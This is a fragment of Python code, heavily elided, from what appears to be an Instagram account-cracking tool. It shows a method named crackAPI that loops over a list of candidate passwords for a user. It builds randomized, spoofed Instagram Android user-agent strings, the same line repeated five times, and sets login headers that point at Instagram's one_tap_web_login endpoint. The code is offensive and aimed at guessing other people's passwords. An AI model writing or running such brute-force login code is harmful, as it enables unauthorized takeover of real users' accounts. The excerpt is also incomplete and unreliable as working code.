    ...
    def crackAPI(self,user,pas):
        ...
        try:
            for pw in pas:
                ...
                f"Instagram 264.0.0.22.106 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; qcom; id_ID; 430370703)",
                f"Instagram 264.0.0.22.106 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; qcom; id_ID; 430370703)",
                f"Instagram 264.0.0.22.106 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; qcom; id_ID; 430370703)",
                f"Instagram 264.0.0.22.106 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; qcom; id_ID; 430370703)",
                f"Instagram 264.0.0.22.106 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; qcom; id_ID; 430370703)",
                ...
                headers = {
                    ...
                    'referer':'https://z-p42.www.instagram.com/api/v1/web/accounts/one_tap_web_login/',
